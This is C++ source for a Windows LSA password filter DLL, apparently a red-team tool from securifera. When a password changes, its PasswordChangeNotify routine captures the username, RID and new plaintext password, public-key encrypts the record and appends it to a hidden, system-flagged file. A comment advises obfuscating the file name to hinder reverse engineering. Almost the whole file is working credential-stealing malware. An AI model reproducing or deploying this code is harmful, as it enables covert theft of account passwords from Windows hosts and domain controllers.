/*	Author:  b0yd
	Website: https://www.securifera.com
	License: https://creativecommons.org/licenses/by/4.0/
*/

#include <windows.h>
#include <winnt.h>
#include <ntsecapi.h>
#include <comdef.h>
#include <stdio.h>
#include <string>
#include <atlbase.h>
#include "PKI.h"
#include "aes.h"

#pragma comment( lib, "cryptlib" )

using CryptoPP::AES;
using CryptoPP::SecByteBlock;
using namespace std;


// Default DllMain implementation
BOOL APIENTRY DllMain( HANDLE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved ){
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
	}
    return TRUE;
}

//===============================================================
/**
*  
*/
void WriteFileOut( string passed_str ){

	// Create the AES key and iv
	SecByteBlock data_out( passed_str.length() );
	memcpy( data_out.data(), passed_str.c_str(), data_out.size() );
	string enc_str;

	// Encrypte AES key and iv
	if (Encryptwithpub(&data_out, &enc_str) == 1)
		return;
	
	FILE *f;	
	char *file = "pw_file.txt"; //File for collecting passwords. Encode, Encrypt, Obfuscate to avoid easy RE
	fopen_s(&f, file, "a+");
	if( f == nullptr )
		return;

	setvbuf(f, NULL, _IONBF, NULL);
		
    //Write encrypted data
	fwrite(enc_str.c_str(), 1, enc_str.length(), f);  
	fwrite("\n",1,1,f);

	//Close the file
	fclose(f);

	//Set file to hidden
	SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM );

}

void __cdecl main(int argc, char *argv[]){

	string test("");
	WriteFileOut(test);
}

// Initialization of Password filter.
BOOLEAN __stdcall InitializeChangeNotify(void){
	return TRUE;
}

// Called by LSA when password was successfully changed.
NTSTATUS __stdcall PasswordChangeNotify( PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword ){
	//copy password
	wstring password( NewPassword->Buffer, NewPassword->Length/2 );
	//copy name
	wstring full_name( UserName->Buffer, UserName->Length/2 );
	
	string out_str("User: ");
	out_str.append(full_name.begin(), full_name.end()).append("\n");
	out_str.append("Id: ");
	out_str.append( std::to_string(RelativeId) ).append("\n");
	out_str.append("Password: ");
	out_str.append(password.begin(), password.end()).append("\n\n");
	WriteFileOut( out_str );

	//Attempt to clear buffers
	password.clear();
	full_name.clear();
	out_str.clear();

	return 0;
}

// Called by LSA to verify whether candidate password is valid
BOOLEAN __stdcall PasswordFilter( PUNICODE_STRING AccountName, PUNICODE_STRING FullName, 
								 PUNICODE_STRING Password, BOOLEAN SetOperation ){
	return TRUE;
}